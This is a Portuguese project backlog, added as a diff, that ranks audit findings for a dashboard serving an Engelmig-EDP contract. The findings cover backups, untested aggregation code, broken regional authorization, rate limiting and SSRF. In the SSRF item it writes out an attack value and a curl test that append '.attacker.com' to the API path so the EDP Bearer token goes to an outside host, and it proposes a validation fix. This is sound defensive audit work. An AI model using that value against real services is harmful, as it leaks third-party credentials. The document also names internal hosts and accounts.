@@ -1,0 +1,944 @@
+# BACKLOG — Ordem estrita, do mais crítico ao menos crítico
+
+> **Regra de ouro:** só trabalhe no próximo item pendente do topo. Não pule.
+> Prioridades foram calibradas contra o **contrato Engelmig × EDP** (6 dígitos ×
+> 60 meses, iniciado julho/2026 — infraestrutura crítica de negócio).
+>
+> **Como ler cada item:**
+> - **Categoria** — Governança, Segurança, Dados, Ops, Frontend, Backend, Qualidade
+> - **Evidência** — file:line que confirma o problema (valide com Read/Grep antes)
+> - **Impacto** — o que acontece se ninguém fizer
+> - **Ação** — passos concretos
+> - **Aceite** — checkboxes que definem "pronto"
+> - **Esforço** — estimativa (dev humano; AI é mais rápido)
+> - **Rollback** — como reverter se der ruim
+> - **Depende de** — outros itens que precisam vir antes
+> - **Fonte** — auditoria/documento onde foi levantado
+>
+> **Ao concluir:** mude status para `done`, adicione data + hash do commit, NÃO
+> delete o item. Isso vira histórico.
+
+## Índice rápido de status
+
+| # | Item | Categoria | Status |
+|---|---|---|---|
+| P0-1 | Continuidade humana (bus factor 1) | Governança | pending |
+| P0-2 | Backup offsite (Postgres) | Ops | pending |
+| P0-3 | Matemática de agregação sem teste + consolidação não-atômica | Dados/Qualidade | pending |
+| P0-4 | `enforceTeamRegional` desligado silenciosamente (v=2) | Segurança/Backend | pending |
+| P0-5 | POST `/metas` quebrado para não-admin | Backend | pending |
+| P1-1 | Alerta ativo (watchdog + Teams) | Ops | pending |
+| P1-2 | `/health` real (mover antes de catch-all + SELECT 1) | Ops | pending |
+| P1-3 | `snapshot_last_ok` em `app_settings` | Ops | pending |
+| P1-4 | SSRF em `/api/wpa/probe` vaza token EDP | Segurança | pending |
+| P1-5 | Rate limit em `/auth/login` + scrypt | Segurança | pending |
+| P1-6 | Git hook `pre-push` roda `node --test` | Qualidade | pending |
+| P1-7 | Retry natural pra MD/SF/rejeições | Dados | pending |
+| P1-8 | `consolidateDay` transacional | Dados | pending |
+| P1-9 | Vendorizar Leaflet + fonte Roboto | Frontend | pending |
+| P1-10 | Remover vazamento de stack trace | Segurança | pending |
+| P2-1 | Testes de contrato de rota (login, scope, health) | Qualidade | pending |
+| P2-2 | Extrair matemática de buckets em módulo único | Dados | pending |
+| P2-3 | `public/` dedicado (parar de servir raiz do repo) | Segurança/Frontend | pending |
+| P2-4 | Escapar dados EDP em `innerHTML` (XSS) | Segurança | pending |
+| P2-5 | Tie-breaker `.order('id')` em queries paginadas | Dados | pending |
+| P2-6 | `statement_timeout` no pool Postgres | Dados | pending |
+| P2-7 | `pg_dump --schema-only` commitado + schema drift | Ops/Dados | pending |
+| P2-8 | Extrair CSS pra `css/app.css` (primeiro passo do split) | Frontend | pending |
+| P2-9 | Watchdog externo (UptimeRobot/BetterStack) | Ops | pending |
+| P2-10 | Persistir estado do `_reclassifyJob` | Backend | pending |
+| P3-1 | Dividir `routes/index.js` por domínio | Backend | pending |
+| P3-2 | Split incremental do `index.html` (JS por aba) | Frontend | pending |
+| P3-3 | Error handler central do Express | Backend | pending |
+| P3-4 | Serialização temporal do cron (consolidate vs upsert) | Backend | pending |
+| P3-5 | Cap de range em endpoints de histórico (evitar OOM) | Dados | pending |
+| P3-6 | Índice de expressão em `note_details` | Dados | pending |
+| P3-7 | `pg_advisory_xact_lock` no `pushTeams` | Dados | pending |
+| P3-8 | Remover código morto Vercel/Supabase-remote | Backend | pending |
+| P3-9 | Constantes duplicadas (SETORES, ENGELMIG_ID) em módulo único | Backend | pending |
+| P3-10 | Acessibilidade básica (role, aria, tabindex) | Frontend | pending |
+
+---
+
+# P0 — Existencial (fazer nas próximas 2 semanas)
+
+## P0-1 — Continuidade humana (bus factor 1)
+
+- **Categoria:** Governança / Operação
+- **Status:** pending
+- **Fonte:** CTO review 2026-07-08
+- **Evidência:** José Zouain é único conhecedor de: senha `wpa_app`
+  (SUPERUSER Postgres), conteúdo do `.env` da VM, credenciais Cloudflare
+  Worker, credenciais WPA da EDP em `AUTH_USERS`, senha `usr_jose` na VM,
+  IP `172.25.3.154` autorizado na EDP. `CHECKPOINT.md:43` documenta
+  "senha do wpa_app conhecida só pelo usr_jose".
+- **Impacto:** Contrato EDP em risco imediato se José ficar 2+ semanas
+  indisponível (doença, luto, oferta, esgotamento). Probabilidade em 60
+  meses ≈ 100%. Consequência: reporte diário não sai, EDP questiona, contrato
+  pode ser rescindido com penalidades.
+- **Ação:**
+  1. Escrever `docs/handoff/RUNBOOK.md` de 1-2 páginas cobrindo: como
+     reiniciar cron/PM2, como restaurar backup, quem contatar na EDP se der
+     problema, como atualizar `AUTH_USERS`, onde ficam as senhas (referência,
+     não conteúdo).
+  2. Configurar cofre compartilhado (Bitwarden Business ~R$15/user/mês, ou
+     KeePass num OneDrive corporativo). Guardar: `.env` completo, senha
+     Postgres, credenciais Cloudflare Worker, senha `usr_jose`, credenciais
+     WPA EDP, endereço IP autorizado EDP.
+  3. Compartilhar leitura com **pelo menos 2 pessoas** (1 da TI da Engelmig,
+     1 da diretoria).
+  4. Registrar formalmente à diretoria da Engelmig: "sistema que sustenta
+     contrato R$X vive em 1 dev. Reforço humano necessário em 90 dias."
+     (email ou ata registrado).
+- **Aceite:**
+  - [ ] `docs/handoff/RUNBOOK.md` existe e cobre os 5 pontos acima.
+  - [ ] Cofre criado, credenciais dentro, testado com login pelas 2 pessoas
+    adicionais.
+  - [ ] Simulação seca: pessoa que nunca tocou o sistema segue o runbook e
+    consegue reiniciar tudo (com apoio remoto, mas sem intervenção do José).
+  - [ ] Email registrado com a diretoria pedindo reforço formal.
+- **Esforço:** 1-2 dias (roteiro humano, não código).
+- **Rollback:** N/A — só adição de docs e config de cofre externo.
+- **Depende de:** nada.
+- **Bloqueia:** todos os outros (pré-requisito emocional de "posso mexer
+  sem medo de eu ser o único que sabe").
+
+## P0-2 — Backup offsite do Postgres
+
+- **Categoria:** Operação
+- **Status:** pending
+- **Fonte:** CTO review 2026-07-08; auditoria de operação
+- **Evidência:** `scripts/backup-wpa-monitor.sh:30` — `BACKUP_DIR=$HOME/backups/wpa_monitor`
+  na própria VM. `POSTGRES-MIGRATION.md:262` até reconhece "copie os backups
+  pra fora do servidor... não é backup" mas nenhum script implementa.
+- **Impacto:** VM ou disco morre → banco + backups desaparecem juntos.
+  Histórico operacional desde abril/2026 é irreconstituível (API WPA só
+  devolve estado ao vivo). 60 meses de contrato dependendo desse banco.
+- **Ação:**
+  1. Instalar `rclone` no usuário (sem sudo — binário single-file em
+     `~/bin/rclone`).
+  2. Configurar `rclone` com OneDrive corporativo do José (M365 já disponível
+     via conta @engelmig.com.br; Fortinet libera outbound Microsoft).
+  3. Adicionar etapa final em `scripts/backup-wpa-monitor.sh` que faz
+     `rclone copy $LATEST_DUMP onedrive:wpa-backups/` após verificação de
+     integridade.
+  4. Configurar retenção offsite (30 dias) via `rclone --min-age 30d --delete`.
+  5. Testar restore uma vez com o dump offsite.
+- **Aceite:**
+  - [ ] `rclone version` roda no usuário sem sudo.
+  - [ ] `rclone lsd onedrive:` lista pastas do OneDrive corporativo.
+  - [ ] Backup diário grava também em `onedrive:wpa-backups/YYYY-MM-DD.dump`.
+  - [ ] Restore testado: baixar dump do OneDrive + `pg_restore` num banco
+    `wpa_monitor_test` funciona.
+  - [ ] Aceite documentado em `RUNBOOK.md`.
+- **Esforço:** meio dia.
+- **Rollback:** Remover a etapa `rclone` do script. Banco continua sendo
+  backupado localmente.
+- **Depende de:** conta OneDrive corporativa com espaço suficiente
+  (~500MB × 30 dias = ~15GB, cabe no M365 padrão).
+- **Bloqueia:** nada, mas P0-1 fica incompleto sem isso.
+
+## P0-3 — Matemática de agregação sem teste + `consolidateDay` não-atômico
+
+- **Categoria:** Dados / Qualidade
+- **Status:** pending
+- **Fonte:** Auditoria de qualidade + auditoria de pipeline (2026-07-08)
+- **Evidência:**
+  - `services/dataService.js:_buildDiaSummary()` (linhas 226-362) — sem teste
+    nenhum. Já produziu bug canc=904/294 documentado no próprio código
+    (`dataService.js:313-317`).
+  - `services/dataWriter.js:consolidateDay()` (linhas 371-455) — faz `DELETE`
+    de `team_daily_totals` D e D-1 seguido de reagregação **sem transação**.
+    Crash entre DELETE e INSERT zera o dia.
+  - `services/dataWriter.js:_notaDate()` e `:_sessionDate()` (linhas 137-188)
+    — regra de negócio central sem teste. Se quebrar, todos os agregados
+    quebram silenciosamente.
+  - Drift-sweep só cobre D-1 e D-7 (`cronService.js:975-985`). D-2 a D-6
+    ficam órfãos se zerarem.
+- **Impacto:** Números que aparecem no painel podem estar errados. Se EDP
+  auditar 60 meses de reporte e encontrar divergência num dia qualquer,
+  contrato marca. Já aconteceu de gerar valor absurdo (904 vs 294) — foi
+  detectado no olho; próxima vez pode passar.
+- **Ação:**
+  1. Criar `test/dataSummary.test.js` que usa `pgShim._setPool()` (infra
+     em `test/pgShim.test.js`) pra injetar pool fake respondendo às 3
+     queries de `_buildDiaSummary` (first/last/rejections) com fixtures
+     pequenas.
+  2. Cobrir:
+     - UUID em 2 buckets → conta 1× no de maior prioridade
+     - UUID no 1º snap que some → cancelada
+     - UUID só no último snap → entrada_nova
+     - Invariante `inicial + entradas_novas = atual + andamento + concluidas
+       + rejeitadas + canceladas` verificada com `assert`
+     - Caso do bug 904/294 replicado
+  3. Exportar `_notaDate` e `_sessionDate` em `dataWriter.js:module.exports`
+     e criar `test/notaDate.test.js` com casos: `conclusionDate` < sessDate
+     → dia anterior; vira-noite mantém sessDate; formato inválido → null.
+  4. **Refatorar `consolidateDay` pra transação atômica**: usar `_getPool()`
+     direto pra `BEGIN`/`DELETE`/`INSERT`/`COMMIT` num único client. Se
+     qualquer passo falhar, `ROLLBACK` — dia continua com dado antigo em
+     vez de zerado.
+  5. Estender `runDailyDriftSweep` pra rodar `detectDrift` em D-1..D-7 (loop
+     de 7 chamadas baratas) em vez de só D-1 e D-7.
+- **Aceite:**
+  - [ ] `test/dataSummary.test.js` roda com 5+ casos, todos passam.
+  - [ ] `test/notaDate.test.js` roda com 6+ casos, todos passam.
+  - [ ] `consolidateDay` envolve DELETE+INSERT em `BEGIN/COMMIT` com
+    `ROLLBACK` em erro.
+  - [ ] Drift-sweep cobre D-1 até D-7 (validar em log de próxima 02:00 BRT
+    após deploy).
+  - [ ] `node --test` sobe de 152 → 165+ testes verdes.
+- **Esforço:** 2-3 dias.
+- **Rollback:** Reverter o commit da transação (funções puras nos testes
+  não têm efeito colateral). Não deixe deployado se testes falharem.
+- **Depende de:** P0-1 (pra você poder pedir revisão de outro dev/AI antes
+  de deployar mudança destrutiva).
+- **Bloqueia:** P3-4 (serialização do cron precisa dessas garantias antes).
+
+## P0-4 — `enforceTeamRegional` desligado silenciosamente
+
+- **Categoria:** Segurança / Backend
+- **Status:** pending
+- **Fonte:** Auditoria de backend + segurança 2026-07-08
+- **Evidência:** `routes/index.js:183` — `if (!req.user || !req.user.regional) return true;`
+  O payload v=2 (post-refactor #33) só tem `req.user.regionals` (array).
+  `req.user.regional` (singular) é sempre `undefined`. Logo `enforceTeamRegional`
+  **sempre retorna `true`** no primeiro branch, e o 403 (linhas 196-201) é
+  inalcançável nas 6 rotas que chamam essa função:
+  `/totais/subcat`, `/performance/equipes`, `/historico/sessoes`,
+  `/historico/equipes`, `/equipes/producao`, `/mapa/equipe`.
+- **Impacto:** Defesa em profundidade morta. Um usuário da regional GUA
+  passando `?team=ETSJC01` (equipe de SJC) hoje **não é bloqueado por essa
+  função**. O `applyScope` ainda intersecta o `regionals`, mas rotas que
+  aceitam `?team=` direto passam. Vazamento potencial entre regionais.
+- **Ação:**
+  1. Ler `routes/index.js:181-206` inteiro.
+  2. Substituir `if (!req.user || !req.user.regional) return true;` por
+     `if (!req.user || !Array.isArray(req.user.regionals) || req.user.regionals.length === 0) return true;`
+  3. Ajustar a lógica interna pra usar `req.user.regionals.includes(teamRegional)`
+     em vez da checagem singular.
+  4. Adicionar caso em `test/auth.test.js`: user com `regionals: ['GUA']`
+     tentando acessar equipe de SJC → 403.
+- **Aceite:**
+  - [ ] `enforceTeamRegional` usa `req.user.regionals` (array).
+  - [ ] Novo teste em `test/auth.test.js` cobre o caso, passa.
+  - [ ] `grep -n "req\.user\.regional[^s]" routes/ middleware/ services/`
+    retorna zero (garante que não ficou vestígio singular).
+- **Esforço:** 1h.
+- **Rollback:** Reverter o commit. A guarda estava morta antes, continua morta.
+- **Depende de:** P1-6 (git hook pre-push) recomendável antes.
+
+## P0-5 — POST `/metas` quebrado pra não-admin (mesmo bug de P0-4)
+
+- **Categoria:** Backend
+- **Status:** pending
+- **Fonte:** Auditoria de backend 2026-07-08
+- **Evidência:** `routes/index.js:311` — `const userReg = req.user.regional;`
+  → `userReg` sempre `undefined`. Linha 322 retorna 403 "Conta sem regional
+  vinculada" pra **qualquer usuário não-admin** tentando salvar metas.
+  Ironicamente, as linhas 325-330 já usam `req.user.regionals` corretamente
+  — só a checagem inicial está errada.
+- **Impacto:** Usuários regionais (GUA, CAC, SJC) não conseguem editar
+  metas de suas equipes. Funcionalidade regressa desde refactor #33.
+- **Ação:**
+  1. `routes/index.js:311` — trocar `req.user.regional` por `req.user.regionals`.
+  2. Ajustar a lógica de checagem (linhas 313-322) pra usar array (verificar
+     se algum item do `regionals` está em `REGIONAIS_VALIDAS`).
+  3. Adicionar teste em `test/auth.test.js`: user `guarapari` faz POST
+     `/api/metas` → 200 (ou 401 se não passar auth por outra razão, mas
+     não 403 "sem regional").
+- **Aceite:**
+  - [ ] Bug corrigido, teste passa.
+  - [ ] Usuário `guarapari` consegue salvar metas via UI (validação manual
+    pós-deploy).
+- **Esforço:** 30min.
+- **Rollback:** Reverter o commit. Regressão volta.
+- **Depende de:** nada.
+
+---
+
+# P1 — Alta prioridade (4 semanas)
+
+## P1-1 — Alerta ativo (watchdog + Teams webhook)
+
+- **Categoria:** Operação
+- **Status:** pending
+- **Fonte:** Auditoria de operação 2026-07-08 (já ocorreu incidente de 3h
+  sem detecção).
+- **Evidência:** Grep por `alert|smtp|nodemailer|notify|watchdog` em
+  `services/`: zero resultados. `/api/admin/health` expõe `last_snapshot.ageMinutes`
+  mas nada o consome automaticamente.
+- **Impacto:** Cron parou 3h uma vez sem ninguém saber. Cada janela de
+  ~15min sem coleta = buraco permanente no histórico.
+- **Ação:**
+  1. Criar Incoming Webhook no Teams (canal operacional da Engelmig ou
+     canal privado do José pra começar).
+  2. Escrever `scripts/watchdog.sh` (~30 linhas): `curl` no
+     `/api/admin/health`, se `ageMinutes > 45` na janela 06-20h BRT ou HTTP
+     != 200, `curl` no webhook Teams com payload de alerta.
+  3. Adicionar ao `crontab -e` do `usr_jose`: `*/15 * * * * ~/prod-stc/scripts/watchdog.sh`.
+- **Aceite:**
+  - [ ] Webhook Teams recebe teste manual (curl com payload dummy).
+  - [ ] `watchdog.sh` roda sem erro e não alerta se sistema saudável.
+  - [ ] Simulação: parar PM2 por 50min em horário útil → alerta chega
+    no Teams em até 15min.
+  - [ ] Documentado no `RUNBOOK.md`.
+- **Esforço:** meio dia.
+- **Rollback:** `crontab -r` remove o watchdog. Sem efeito no sistema.
+- **Depende de:** P1-2 (`/health` real).
+
+## P1-2 — `/health` real (mover antes do catch-all + SELECT 1)
+
+- **Categoria:** Operação
+- **Status:** pending
+- **Fonte:** Auditoria de operação + backend 2026-07-08
+- **Evidência:** `server.js:75-78` registra `app.get('*')` que responde
+  `index.html` pra qualquer path não-`/api`. `server.js:79` registra
+  `app.get('/health')` **depois** — Express casa por ordem, então `/health`
+  devolve HTML 200 sempre. Nunca o JSON esperado.
+- **Impacto:** Qualquer monitor externo (P1-1, uptime check) que aponte
+  pra `/health` sempre vê 200, mesmo com Postgres caído ou cron morto.
+  Monitoria vira placebo.
+- **Ação:**
+  1. Mover `app.get('/health')` pra **antes** do `express.static` e do
+     `app.get('*')`.
+  2. Fazer o handler executar `SELECT 1` no pool + ler idade do último
+     snapshot em `snapshots` (max(captured_at)).
+  3. Retornar 503 se: SELECT 1 falhar OU `ageMinutes > 30` em horário 06-20h.
+     Retornar 200 com JSON `{ok:true, db:'ok', last_snapshot_min: N}`
+     caso contrário.
+- **Aceite:**
+  - [ ] `curl -sS http://localhost:3002/health` retorna JSON válido, não HTML.
+  - [ ] Com Postgres parado (`pg_ctl stop` ou docker stop), retorna 503.
+  - [ ] Documentado em `RUNBOOK.md`.
+- **Esforço:** 30min.
+- **Rollback:** Trivial (reverter ordem).
+- **Depende de:** nada.
+
+## P1-3 — `snapshot_last_ok` em `app_settings`
+
+- **Categoria:** Operação
+- **Status:** pending
+- **Fonte:** Auditoria de pipeline 2026-07-08
+- **Evidência:** `services/cronService.js:170-171` — snapshot_failed só vira
+  `log.error`, sem persistência. Só `subcat_error` tem registro em
+  `app_settings` (linhas 33-49). Queda da WPA por horas é invisível.
+- **Impacto:** `/admin/health` (que alimenta o P1-1) precisa saber quando
+  foi o último snapshot bem-sucedido. Hoje calcula da tabela `snapshots`,
+  o que é frágil (pode não representar tentativa que falhou).
+- **Ação:**
+  1. Replicar padrão `_recordSubcatError` (`cronService.js:33-49`) em novas
+     funções `_recordSnapshotOk()` e `_recordSnapshotError()`.
+  2. Chamar `_recordSnapshotOk()` ao final de `runSnapshot` bem-sucedido
+     (grava timestamp).
+  3. Chamar `_recordSnapshotError({at, msg})` em cada catch de `runSnapshot`.
+  4. Expor em `/api/admin/health` (`routes/index.js:1242`) os campos
+     `snapshot.last_ok` e `snapshot.last_error`.
+- **Aceite:**
+  - [ ] `SELECT data FROM app_settings WHERE key='snapshot_last_ok'` retorna
+    JSON válido com `ts` recente.
+  - [ ] `/api/admin/health` retorna esses campos.
+  - [ ] Card no frontend Admin exibe (replicar padrão do card de
+    `subcat_error` em `index.html:11754`).
+- **Esforço:** 2-3h.
+- **Rollback:** Trivial (funções novas não interferem em nada existente).
+- **Depende de:** nada.
+
+## P1-4 — SSRF em `/api/wpa/probe` vaza token EDP
+
+- **Categoria:** Segurança
+- **Status:** pending
+- **Fonte:** Auditoria de segurança 2026-07-08
+- **Evidência:** `routes/index.js:905-908` — `const path = req.query.path || ...; const wpaRes = await wpaFetch(path);`
+  sem validação. `services/wpaService.js:340-347` — `wpaFetch` faz
+  `fetch(WPA_API + path, { Authorization: 'Bearer ' + token })`.
+  Concatenação de string permite `?path=.attacker.com/` → destino vira
+  `https://edp-wpa-web-api.azurewebsites.net.attacker.com/` com Bearer
+  token da EDP anexado.
+- **Impacto:** Qualquer usuário autenticado (dos 5) pode exfiltrar o token
+  da EDP pra host controlado. Combinado com brute force de login (P1-5),
+  qualquer atacante interno pode fazer isso. Token EDP é credencial de
+  terceiro — vazamento pode encerrar contrato.
+- **Ação:**
+  1. Em `routes/index.js:905`, adicionar validação:
+     ```js
+     const path = req.query.path || '';
+     if (!/^\/api\/[a-zA-Z0-9/_?=&%,-]*$/.test(path)) {
+       return res.status(400).json({ error: 'path inválido' });
+     }
+     ```
+  2. Aplicar mesma validação nas rotas `/api/debug/*` que repassam
+     `sectorId` cru (linhas 925-1213).
+  3. Considerar isolar todas as rotas de debug atrás de env `DEBUG_ROUTES=1`
+     (não montar em produção).
+- **Aceite:**
+  - [ ] Teste manual: `curl "/api/wpa/probe?path=.attacker.com/"` retorna 400.
+  - [ ] Teste manual: `curl "/api/wpa/probe?path=/api/teamsstatus/V2"` continua
+    funcionando (200 com dados da EDP).
+  - [ ] Grep confirma que nenhuma outra rota concatena `req.query.*` em
+    URL sem validação: `grep -n "wpaFetch(.*req\.query" routes/`
+- **Esforço:** 30min-1h.
+- **Rollback:** Reverter o commit. Vulnerabilidade volta.
+- **Depende de:** nada.
+
+## P1-5 — Rate limit em `/auth/login` + scrypt
+
+- **Categoria:** Segurança
+- **Status:** pending
+- **Fonte:** Auditoria de segurança 2026-07-08
+- **Evidência:** `routes/index.js:34-51` rota de login sem limitador.
+  `server.js:15-18` nenhum middleware de rate limit. `middleware/auth.js:97-108`
+  usa `sha256` puro sem salt.
+- **Impacto:** Painel escuta em todas as interfaces (`server.js:91` sem
+  host). Rede 172.25.x tem qualquer máquina alcançando `/auth/login` sem
+  throttle. 5 contas, brute force ilimitado. Se `AUTH_USERS` vazar por
+  qualquer canal, SHA-256 sem salt cai em segundos com rainbow table.
+- **Ação:**
+  1. Adicionar limitador em memória em `routes/index.js:34`:
+     `const _loginAttempts = new Map();` — chave `${ip}:${username}`,
+     valor `{count, firstAt}`. Regra: >10 tentativas em 5min → 429 com
+     `Retry-After: 300`.
+  2. **Trocar `sha256` por `scrypt`** em `middleware/auth.js:97-108`. `scrypt`
+     é nativo em `crypto` (sem dependência nova). Salt por usuário.
+  3. Formato novo do `AUTH_USERS`:
+     `user:scrypt$salt$hash:role:regional1|regional2` (novo prefixo `scrypt$`
+     no campo hash).
+  4. Manter compat retroativa por 1 release: se hash começa com `scrypt$`,
+     valida com scrypt; caso contrário, tenta SHA-256 (legacy). Logar
+     warning quando cair no legacy.
+  5. Script `scripts/rehash-users.js` que lê AUTH_USERS atual e imprime
+     versão com scrypt (dev roda uma vez, cola no .env).
+- **Aceite:**
+  - [ ] 11 tentativas de login errado no mesmo user em 1min retornam 429.
+  - [ ] Login válido continua funcionando.
+  - [ ] Novo formato scrypt validado em `test/auth.test.js`.
+  - [ ] Compat retroativa: hash SHA-256 antigo ainda valida com warn.
+  - [ ] `.env` da produção migrado pro formato novo.
+- **Esforço:** meio dia.
+- **Rollback:** Reverter o commit. `.env` volta ao formato antigo (guardar
+  backup do `.env` no cofre P0-1 antes de mudar).
+- **Depende de:** P0-1 (cofre pra backup do `.env`).
+
+## P1-6 — Git hook `pre-push` roda `node --test`
+
+- **Categoria:** Qualidade
+- **Status:** pending
+- **Fonte:** Auditoria de qualidade 2026-07-08 (suíte quebrada 4 semanas
+  sem ninguém notar).
+- **Evidência:** `.github/` não existe (sem CI). `package.json:10` só tem
+  `"test": "node --test"`. Ninguém força a rodar.
+- **Impacto:** Suíte de 152 testes é rede de segurança inútil se ficar
+  vermelha sem alerta. Já aconteceu em 2026.
+- **Ação:**
+  1. Criar `.git/hooks/pre-push` (script bash):
+     ```bash
+     #!/bin/bash
+     echo "🧪 Rodando node --test antes do push..."
+     if ! node --test; then
+       echo "❌ Testes falharam. Push abortado. Corrija ou use 'git push --no-verify'."
+       exit 1
+     fi
+     ```
+  2. `chmod +x .git/hooks/pre-push`.
+  3. Como hooks locais não são versionados por padrão, adicionar
+     `scripts/install-hooks.sh` que copia de `hooks/pre-push` (versionado)
+     pra `.git/hooks/pre-push`. Documentar em CLAUDE.md que novo dev roda
+     esse script após clone.
+- **Aceite:**
+  - [ ] `hooks/pre-push` existe no repo (versionado).
+  - [ ] `scripts/install-hooks.sh` instala corretamente.
+  - [ ] Simulação: `git push` com teste quebrado → aborta com mensagem.
+  - [ ] Documentado em `CLAUDE.md`.
+- **Esforço:** 30min.
+- **Rollback:** `rm .git/hooks/pre-push` — desliga sem afetar mais nada.
+- **Depende de:** nada.
+
+## P1-7 — Retry natural pra MD/SF/rejeições
+
+- **Categoria:** Dados / Pipeline
+- **Status:** pending
+- **Fonte:** Auditoria de pipeline 2026-07-08
+- **Evidência:**
+  - `services/classifierService.js:40-46` — `safeJson` engole erro e retorna
+    `null`. `:89-96` — `md=null` → grava `OUTROS` no cache.
+  - `services/rejectionService.js:226-233` — `all_failed` retorna struct
+    com `motivo_codes=[]` em vez de null. `services/cronService.js:439-445`
+    — filtro `jaCacheadas` nunca retenta note_id já gravado.
+- **Impacto:** Erro transiente da WPA (timeout, cold-start Azure) vira
+  classificação errada **permanente**. Só DD tem retry (`cronService.js:642`).
+  MD/SF/rejeições degradam KPIs de subcategoria a cada instabilidade EDP.
+- **Ação:**
+  1. Em `classifierService.js:classificarMD` e `classificarSF`: quando
+     `md/sf === null` (distinto de "respondeu sem Code"), retornar `null`
+     em vez do struct com sub_code='OUTROS'.
+  2. No caller (`upsertSubcatTotals` em `dataWriter.js`), pular UUIDs
+     com `null` — não adicionar ao cache. Próximo ciclo pega de graça
+     porque `note_id` continua fora de `getClassifiedIds`.
+  3. Em `rejectionService.js:runClassifyRejections`, não gravar linhas com
+     `endpoint_missing` ou `all_failed=true`. Retornar `null` do processor,
+     caller pula.
+  4. Adicionar métrica no `/admin/health`: contador de UUIDs pendentes
+     (não classificados) — se crescer descontroladamente, alerta.
+- **Aceite:**
+  - [ ] Simulação: mockar `wpaFetch` retornando erro por 1 ciclo. UUIDs
+    daquele ciclo NÃO devem entrar em `note_subcategorias`.
+  - [ ] Ciclo seguinte com WPA respondendo normalmente: UUIDs pegos e
+    classificados corretamente.
+  - [ ] `/admin/health` mostra contador de pendentes.
+- **Esforço:** 3-4h.
+- **Rollback:** Reverter o commit. Volta ao comportamento anterior.
+- **Depende de:** nada.
+
+## P1-8 — `consolidateDay` transacional (parte de P0-3)
+
+Ver P0-3. Este item é a parte de refactor de código do fix — pode ser
+feita em PR separado depois dos testes.
+
+## P1-9 — Vendorizar Leaflet + fonte Roboto
+
+- **Categoria:** Frontend
+- **Status:** pending
+- **Fonte:** Auditoria de frontend 2026-07-08
+- **Evidência:** `index.html:16-19` — `unpkg.com/leaflet@1.9.4` e
+  `leaflet-polylinedecorator`. `index.html:8-9` — `fonts.googleapis.com`.
+  Enquanto o comentário em `index.html:10-13` documenta que
+  `cdn.sheetjs.com` foi bloqueado pelo Fortinet e quebrou tudo.
+- **Impacto:** Próxima política restritiva do Fortinet mata as abas Mapa
+  e Deslocamentos com `L is not defined`. Sem deploy, sem aviso, sem forma
+  de diagnóstico até alguém abrir F12.
+- **Ação:**
+  1. `curl` os arquivos pra `vendor/`:
+     - `vendor/leaflet-1.9.4.js`
+     - `vendor/leaflet-1.9.4.css`
+     - `vendor/leaflet-images/` (marker icons)
+     - `vendor/leaflet-polylinedecorator.js`
+     - `vendor/roboto/*.woff2` (weights 400/500/700)
+  2. Atualizar `<link>` e `<script>` em `index.html` pra apontar pra
+     `vendor/`.
+  3. Adicionar `@font-face` em CSS pra Roboto local.
+  4. Testar aba Mapa e Deslocamentos em produção com Fortinet ativo.
+- **Aceite:**
+  - [ ] Sem requests pra `unpkg.com` ou `fonts.googleapis.com` (F12 → Network).
+  - [ ] Mapa desenha, rota traça, marcadores aparecem.
+  - [ ] Fonte Roboto carrega (visualmente indistinguível).
+- **Esforço:** 1h.
+- **Rollback:** Reverter commit. Volta pra CDN.
+- **Depende de:** nada.
+
+## P1-10 — Remover vazamento de stack trace ao cliente
+
+- **Categoria:** Segurança
+- **Status:** pending
+- **Fonte:** Auditoria de backend 2026-07-08
+- **Evidência:** `routes/index.js:879` — `stack: err.stack?.split('\n').slice(0,3).join(' | ')`
+  no JSON de resposta 500. Expõe estrutura interna, nomes de arquivos,
+  linha de código.
+- **Impacto:** Baixo mas real. Facilita reconnaissance pra atacante interno.
+- **Ação:** Remover o campo `stack` do JSON de resposta. Manter no log
+  do servidor (`log.error` com `err.stack` completo).
+- **Aceite:**
+  - [ ] `curl` numa rota que gera erro não retorna campo `stack` no JSON.
+  - [ ] `pm2 logs` ainda mostra stack completo.
+- **Esforço:** 5min.
+- **Rollback:** Trivial.
+- **Depende de:** nada.
+
+---
+
+# P2 — Média prioridade (2 meses)
+
+## P2-1 — Testes de contrato de rota (login, scope, health)
+
+- **Categoria:** Qualidade
+- **Status:** pending
+- **Fonte:** Auditoria de qualidade + backend 2026-07-08
+- **Evidência:** `test/` não tem nenhum arquivo cobrindo `routes/*.js`.
+  Composição `compatRegionalParam → applyScope → handler` nunca é
+  exercitada ponta a ponta.
+- **Impacto:** Uma rota que esqueça o middleware `applyScope` vaza dados
+  de outra regional silenciosamente. Nenhum teste hoje pegaria.
+- **Ação:**
+  1. Exportar `app` de `server.js` sem chamar `.listen()`. Chamar `listen(0)`
+     no `before()` do teste (porta aleatória).
+  2. Criar `test/routes.test.js` com `fetch` nativo do Node contra
+     `http://127.0.0.1:${port}`.
+  3. Cobrir:
+     - `POST /api/auth/login` com credencial errada → 401
+     - `POST /api/auth/login` OK → 200 com token
+     - `GET /api/teams` sem token → 401
+     - `GET /api/teams?regionals=SJC` com token GUA → 403 ou array
+       filtrado só de GUA
+     - `GET /health` → JSON válido (após P1-2)
+- **Aceite:** 5+ testes de rota, todos verdes.
+- **Esforço:** 1-2 dias.
+- **Rollback:** Trivial (testes novos).
+- **Depende de:** P1-2.
+
+## P2-2 — Extrair matemática de buckets em módulo único
+
+- **Categoria:** Dados
+- **Status:** pending
+- **Fonte:** Auditoria de pipeline 2026-07-08 (admitido em comentário do
+  próprio código).
+- **Evidência:** `services/dataWriter.js:592-596` — comentário: "Mesma
+  matemática do `_buildDiaSummary` (dataService.js)". Duas cópias da
+  prioridade `concluida > rejeitada > andamento > atual` + cálculo de
+  canceladas/entradas em `dataWriter.js:658-669` e `dataService.js:313-347`.
+- **Impacto:** Mudança de regra num lugar e não no outro = histórico
+  persistente (`team_daily_carteira`) divergindo do summary ao vivo.
+  Bug de 11/06 (canc=904/294) foi exatamente disso.
+- **Ação:**
+  1. Criar `services/carteiraMath.js`:
+     ```js
+     module.exports = { classifyBuckets, computeSummary };
+     // classifyBuckets(inicial:Set, atualRaw:Set, andamentoRaw:Set,
+     //                 concluidasRaw:Set, rejeitadasRaw:Set) → {
+     //   atual:Set, andamento:Set, concluidas:Set, rejeitadas:Set,
+     //   canceladas:Set, entradas_novas:Set
+     // }
+     ```
+  2. Refatorar `dataService.js:_buildDiaSummary` e `dataWriter.js:upsertTeamDailyCarteira`
+     pra usar `classifyBuckets`.
+  3. Criar `test/carteiraMath.test.js` (função pura, fixtures simples).
+- **Aceite:** Um único ponto de mudança pra regra de bucket. Testes verdes.
+- **Esforço:** meio dia.
+- **Rollback:** Reverter commit (função pura, sem efeito colateral).
